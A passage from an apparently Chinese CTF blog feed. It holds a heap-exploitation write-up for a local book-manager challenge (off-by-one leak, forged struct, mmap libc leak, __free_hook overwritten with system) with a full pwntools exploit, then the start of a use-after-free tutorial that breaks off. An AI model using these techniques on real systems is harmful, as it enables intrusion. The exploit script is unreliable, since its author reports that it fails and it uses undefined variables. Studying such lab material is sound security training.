0x0000000000000000</span><br></pre></td></tr></table></figure><p>为了实现泄漏，首先在author name中需要输入32个字节来使得结束符被覆盖掉。之后我们创建book1，这个book1的指针会覆盖</p><h4 id="这里注意："><a href="#这里注意：" class="headerlink" title="这里注意："></a>这里注意：</h4><p>我们ida查看的时候按照ida给的形式是无法实现的，但是通过自己调试发现是可以实现的，这里告诉我们还是要多调试</p><p>具体为：我们先将32个字符填满，导致\x00被覆盖，之后我们申请book的地址会覆盖溢出到下面的\x00，通过printf函数可以进行泄露我们申请的第一个book堆的地址（printf函数存在00截断）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">auther_name(<span class="string">'a'</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">create_book(<span class="string">'c'</span>,<span class="number">208</span>,<span class="string">'b'</span>,<span class="number">32</span>) <span class="comment">#此处需要自己计算第一个size的大小，另覆盖后的地址指向des</span></span><br><span class="line"></span><br><span class="line">print_detail()</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">32</span>)</span><br><span class="line">first_book_add = u64(p.recv(<span class="number">6</span>).strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(first_book_add)</span><br></pre></td></tr></table></figure><h3 id="2-伪造book"><a href="#2-伪造book" class="headerlink" title="2.伪造book"></a>2.伪造book</h3><p>我们发现存在edit author name的功能，这样的话我们可以佳宁我们申请到的第一个book堆的地址的最后两位进行覆盖，得到一个新的地址，而此时，这个新的地址就是我们的伪造book，并且系统默认其为id=1的book</p><p>同时，我们发现该程序存在一个函数可以修改description，如果我们将这个最后12位被覆盖的地址指向第一个book的des部分，我们就可以实现对其的写入</p><p>所以我们可以根据我们的计算结果去申请第一个book堆</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_book(<span class="string">'c'</span>,<span class="number">208</span>,<span class="string">'b'</span>,<span class="number">32</span>) <span class="comment">#此处需要自己计算第一个size的大小，另覆盖后的地址指向des</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1 = p64(<span class="number">1</span>)+p64(first_book_add+<span class="number">0x38</span>)+p64(first_book_add+<span class="number">0x38</span>)+p64(<span class="number">0xffff</span>) <span class="comment">#这里add+0x38是为了指向book2的name，因为分配中的chunk的pre与size可以用来存放上一个堆的数据</span></span><br><span class="line">edit(<span class="number">1</span>,payload1)</span><br></pre></td></tr></table></figure><h3 id="3-泄露libc基地址"><a href="#3-泄露libc基地址" class="headerlink" title="3.泄露libc基地址"></a>3.泄露libc基地址</h3><p>1.我们发现我们可以使用改程序的show功能输出book结构体的所有数据</p><p>那么我们就可以根据我们伪造的book的内容指向来获取book2的name地址</p><p>2.这道题的巧妙之处在于在分配第二个book时，使用一个很大的尺寸，使得堆以mmap模式进行拓展。我们知道堆有两种拓展方式一种是brk会直接拓展原来的堆，另一种是mmap会单独映射一块内存。</p><p>在这里我们申请一个超大的块，来使用mmap扩展内存。因为mmap分配的内存与libc之前存在固定的偏移因此可以推算出libc的基地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_book(<span class="string">'aa'</span>,<span class="number">0x21000</span>,<span class="string">'bb'</span>,<span class="number">0x21000</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">change_name(<span class="string">'a'</span>*<span class="number">32</span>) <span class="comment">#将第一个book的地址最低两位覆盖</span></span><br><span class="line">print_detail()</span><br><span class="line">p.recvuntil(<span class="string">'Name: '</span>)</span><br><span class="line">name_add=u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(name_add)</span><br></pre></td></tr></table></figure><p>但是偏移这一块我还是没大看懂，lib基地址是不断变化的，但是偏移是不变的，所以我们先看一下偏移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#offset = name_add-0x7ffff7a0d000</span></span><br><span class="line"><span class="comment">#我们需要先通过调试将其算出来，刚开始做的时候这里做错了</span></span><br><span class="line">libc_add = name_add - offset</span><br><span class="line"><span class="keyword">print</span> hex(libc_add)</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/02/09/1hKmS1.png" alt="1hKmS1.png"></p><p>众所周知mmap分配的空间是在堆与栈之间分配的</p><h3 id="4-getshell"><a href="#4-getshell" class="headerlink" title="4.getshell"></a>4.getshell</h3><p>通过上面我们可以获取/bin/sh与system与free__hook的地址</p><p>1.我们将前两个地址通过edit（1）可以将book2结构体中存储的name以及des得地址进行覆盖</p><p>2.之后可以通过edit（2）将free_hook指向的空间设置为system，这样就可以getshell了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>] + libc_base</span><br><span class="line"><span class="keyword">print</span> hex(free_hook)</span><br><span class="line">sys_add = libc.symbols[<span class="string">'system'</span>] +libc_base</span><br><span class="line"><span class="keyword">print</span> hex(sys_add)</span><br><span class="line">bin_add = libc.search(<span class="string">'/bin/sh'</span>).next() + libc_base</span><br><span class="line"><span class="keyword">print</span> hex(bin_add)</span><br><span class="line">excu_add = libc_base + <span class="number">0x4526a</span></span><br><span class="line"><span class="comment">##getshell</span></span><br><span class="line">payload2 = p64(free_hook) + p64(free_hook) <span class="comment">#fake_book的des指向的是book2的name，我们输入payload会将book的name地址与des地址分别覆盖为free_hook</span></span><br><span class="line">edit(<span class="number">1</span>,payload2)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload3 = p64(sys_add) <span class="comment">#将book2的des的内容设置为sys地址就是将freehook的内容设置为sys_add，这样调用free的时候就会调用sys</span></span><br><span class="line"><span class="comment">#edit(2,payload3)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Enter the book id you want to edit: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Enter new book description: '</span>)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">deleate(<span class="number">2</span>) <span class="comment">#调用free时，本该先为free(book_name),现在变成了system(/bin/sh)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br></pre></td></tr></table></figure><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>我自认为我这个脚本的逻辑很清楚，但是到最后edit（2）的时候就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Enter the book id you want to edit: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Enter new book description: '</span>)</span><br><span class="line">p.sendline(payload3)</span><br></pre></td></tr></table></figure><p>当运行到这里的时候，程序总会出现edit description错误，感觉没啥问题，但是就是不行</p><p>还请大佬们指教</p><p>半完结，半撒花=。=</p><p>基础知识：</p><p>libc基地址每次调用都会变化</p><p>最后上完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding: UTF-8 -*- </span></span><br><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./pwn'</span></span><br><span class="line"></span><br><span class="line">libc_name = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ip = ''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#port = ''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line">p = process(file_name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_book</span><span class="params">(name,size1,des,size2)</span>:</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">": "</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(str(size1))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Enter book name (Max 32 chars):'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(str(name))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Enter book description size:'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(str(size2))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Enter book description:'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(str(des))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deleate</span><span class="params">(index)</span>:</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Enter the book id you want to delete:'</span>)</span><br><span class="line"></span><br><span class="line">p.send(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(id_a,new_des)</span>:</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Enter the book id you want to edit: '</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(str(id_a))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Enter new book description: '</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(new_des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_detail</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_name</span><span class="params">(name)</span>:</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Enter author name:'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(str(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">auther_name</span><span class="params">(name)</span>:</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Enter author name:'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(str(name))</span><br><span class="line"></span><br><span class="line">auther_name(<span class="string">'a'</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">create_book(<span class="string">'c'</span>,<span class="number">208</span>,<span class="string">'b'</span>,<span class="number">32</span>) <span class="comment">#此处需要自己计算第一个size的大小，另覆盖后的地址指向des</span></span><br><span class="line"></span><br><span class="line">print_detail()</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">32</span>)</span><br><span class="line">first_book_add = u64(p.recv(<span class="number">6</span>).strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(first_book_add)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvline()</span></span><br><span class="line">create_book(<span class="string">'aa'</span>,<span class="number">0x21000</span>,<span class="string">'bb'</span>,<span class="number">0x21000</span>)</span><br><span class="line"></span><br><span class="line">payload1 = p64(<span class="number">1</span>)+p64(first_book_add+<span class="number">0x38</span>)+p64(first_book_add+<span class="number">0x38</span>)+p64(<span class="number">0xffff</span>) <span class="comment">#这里add+0x38是为了指向book2的name，因为分配中的chunk的pre与size可以用来存放上一个堆的数据</span></span><br><span class="line">edit(<span class="number">1</span>,payload1)</span><br><span class="line">change_name(<span class="string">'a'</span>*<span class="number">32</span>) <span class="comment">#将第一个book的地址最低两位覆盖</span></span><br><span class="line">print_detail()</span><br><span class="line">p.recvuntil(<span class="string">'Name: '</span>)</span><br><span class="line">name_add=u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(name_add)</span><br><span class="line"><span class="comment">#offset = name_add-0x7ffff7a0d000</span></span><br><span class="line"><span class="comment">#我们需要先通过调试将其算出来，刚开始做的时候这里做错了</span></span><br><span class="line">libc_add = name_add - offset</span><br><span class="line"><span class="keyword">print</span> hex(libc_add)</span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>] + libc_base</span><br><span class="line"><span class="keyword">print</span> hex(free_hook)</span><br><span class="line">sys_add = libc.symbols[<span class="string">'system'</span>] +libc_base</span><br><span class="line"><span class="keyword">print</span> hex(sys_add)</span><br><span class="line">bin_add = libc.search(<span class="string">'/bin/sh'</span>).next() + libc_base</span><br><span class="line"><span class="keyword">print</span> hex(bin_add)</span><br><span class="line">excu_add = libc_base + <span class="number">0x4526a</span></span><br><span class="line"><span class="comment">##getshell</span></span><br><span class="line">payload2 = p64(free_hook) + p64(free_hook) <span class="comment">#fake_book的des指向的是book2的name，我们输入payload会将book的name地址与des地址分别覆盖为free_hook</span></span><br><span class="line">edit(<span class="number">1</span>,payload2)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload3 = p64(sys_add) <span class="comment">#将book2的des的内容设置为sys地址就是将freehook的内容设置为sys_add，这样调用free的时候就会调用sys</span></span><br><span class="line"><span class="comment">#edit(2,payload3)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Enter the book id you want to edit: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Enter new book description: '</span>)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">deleate(<span class="number">2</span>) <span class="comment">#调用free时，本该先为free(book_name),现在变成了system(/bin/sh)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Use after free</title>
      <link href="/2020/02/03/Use%20after%20free/"/>
      <url>/2020/02/03/Use%20after%20free/</url>
      
        <content type="html"><![CDATA[<h1 id="Use-after-free浅学"><a href="#Use-after-free浅学" class="headerlink" title="Use after free浅学"></a>Use after free浅学</h1><a id="more"></a><p>先放个ctf—wiki链接=.=</p><p><a href="https://wiki.x10sec.org/pwn/heap/use_after_free/" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/heap/use_after_free/</a></p><h2 id="1-简述"><a href="#1-简述" class="headerlink" title="1,.简述"></a>1,.简述</h2><p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p><ul><li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li><li>内存块被释放后，其对应的指针没有被设置为NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li></ul><p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为NULL的内存指针为dangling pointer。</strong></p><h2 id="2-ctf-wiki样例"><a href="#2-ctf-wiki样例" class="headerlink" title="2.ctf-wiki样例"></a>2.ctf-wiki样例</h2><p>这里我们以 HITCON-training 中的 lab 10 hacknote为例。</p><h3 id="功能分析¶"><a href="#功能分析¶" class="headerlink" title="功能分析¶"></a>功能分析<a href="https://wiki.x10sec.org/pwn/heap/use_after_free/#_3" target="_blank" rel="noopener">¶</a></h3><p>我们可以简单分析下程序，可以看出在程序的开头有个menu函数，其中有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">puts(&quot; 1. Add note          &quot;);</span><br><span class="line">puts(&quot; 2. Delete note       &quot;);</span><br><span class="line">puts(&quot; 3. Print note        &quot;);</span><br><span class="line">puts(&quot; 4. Exit              &quot;);</span><br></pre></td></tr></table></figure><p>故而程序应该主要有3个功能。之后程序会根据用户的输入执行相应的功能。</p><h4 id="add-note¶"><a href="#add-note¶" class="headerlink" title="add_note¶"></a>add_note<a href="https://wiki.x10sec.org/pwn/heap/use_after_free/#add_note" target="_blank" rel="noopener">¶</a></h4><p>根据程序，我们可以看出程序最多可以添加5个note。每个note有两个字段put与content，其中put会被设置为一个函数，其函数会输出 content 具体的内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">unsigned int add_note()</span><br><span class="line">&#123;</span><br><span class="line">  note *v0; &#x2F;&#x2F; ebx</span><br><span class="line">  signed int i; &#x2F;&#x2F; [esp+Ch] [ebp-1Ch]</span><br><span class="line">  int size; &#x2F;&#x2F; [esp+10h] [ebp-18h]</span><br><span class="line">  char buf; &#x2F;&#x2F; [esp+14h] [ebp-14h]</span><br><span class="line">  unsigned int v5; &#x2F;&#x2F; [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; __readgsdword(0x14u);</span><br><span class="line">  if ( count &lt;&#x3D; 5 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i &#x3D; 0; i &lt;&#x3D; 4; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( !notelist[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        notelist[i] &#x3D; malloc(8u);</span><br><span class="line">        if ( !notelist[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        notelist[i]-&gt;put &#x3D; print_note_content;</span><br><span class="line">        printf(&quot;Note size :&quot;);</span><br><span class="line">        read(0, &amp;buf, 8u);</span><br><span class="line">        size &#x3D; atoi(&amp;buf);</span><br><span class="line">        v0 &#x3D; notelist[i];</span><br><span class="line">        v0-&gt;content &#x3D; malloc(size);</span><br><span class="line">        if ( !notelist[i]-&gt;content )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;Content :&quot;);</span><br><span class="line">        read(0, notelist[i]-&gt;content, size);</span><br><span class="line">        puts(&quot;Success !&quot;);</span><br><span class="line">        ++count;</span><br><span class="line">        return __readgsdword(0x14u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Full&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="print-note¶"><a href="#print-note¶" class="headerlink" title="print_note¶"></a>print_note<a href="https://wiki.x10sec.org/pwn/heap/use_after_free/#print_note" target="_blank" rel="noopener">¶</a></h4><p>print_note就是简单的根据给定的note的索引来输出对应索引的note的内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned int print_note()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [esp+4h] [ebp-14h]</span><br><span class="line">  char buf; &#x2F;&#x2F; [esp+8h] [ebp-10h]</span><br><span class="line">  unsigned int v3; &#x2F;&#x2F; [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, &amp;buf, 4u);</span><br><span class="line">  v1 &#x3D; atoi(&amp;buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt;&#x3D; count )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( notelist[v1] )</span><br><span class="line">    notelist[v1]-&gt;put(notelist[v1]);</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="delete-note¶"><a href="#delete-note¶" class="headerlink" title="delete_note¶"></a>delete_note<a href="https://wiki.x10sec.org/pwn/heap/use_after_free/#delete_note" target="_blank" rel="noopener">¶</a></h4><p>delete_note 会根据给定的索引来释放对应的note。但是值得注意的是，在 删除的时候，只是单纯进行了free，而没有设置为NULL，那么显然，这里是存在Use After Free的情况的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">unsigned int del_note()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [esp+4h] [ebp-14h]</span><br><span class="line">  char buf; &#x2F;&#x2F; [esp+8h] [ebp-10h]</span><br><span class="line">  unsigned int v3; &#x2F;&#x2F; [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, &amp;buf, 4u);</span><br><span class="line">  v1 &#x3D; atoi(&amp;buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt;&#x3D; count )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    free(notelist[v1]-&gt;content);</span><br><span class="line">    